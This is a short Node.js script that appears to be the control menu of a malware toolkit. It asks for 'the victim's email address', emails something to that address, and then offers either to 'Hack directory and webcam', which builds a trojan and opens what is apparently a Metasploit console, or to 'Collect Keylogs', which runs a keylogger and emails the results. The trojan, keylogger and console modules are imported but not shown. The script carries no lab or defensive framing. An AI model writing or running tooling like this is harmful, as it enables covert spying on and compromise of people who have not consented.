const inquirer = require("inquirer");
const { exec } = require("child_process");
const directoryHack = require("./Directory_Hack");
const keyLogger = require("./Keylogger");
const emailService = require("./Email_Service");
const Q = require("q");
const { openConsole } = require("./OpenMsfConsole");

// TODO Program should set parameters and open clien within terminal
const emailPrompt = () =>{
  inquirer
  .prompt([
    {
      type: "input",
      message: "Enter the victim's email address",
      name: "email",
    },
  ])
  .then((answers) => {
    emailService.send(answers.email);
    main();
  });
}

const main = () => {
  const deferred = Q.defer();

  inquirer
    .prompt([
      {
        type: "list",
        message: "Choose the action you wish to take",
        name: "action",
        choices: ["Hack directory and webcam", "Collect Keylogs"],
      },
    ])
    .then((answers) => {
      if (answers.action === "Hack directory and webcam") {
        directoryHack.createTrojan(exec, Q).then((result) => {
          console.log("here");
          openConsole(exec, inquirer);
        });
      } else if (answers.action === "Collect Keylogs"){
        keyLogger.hack(exec);
        emailService.send(exec);
      }

    });
};

emailPrompt();
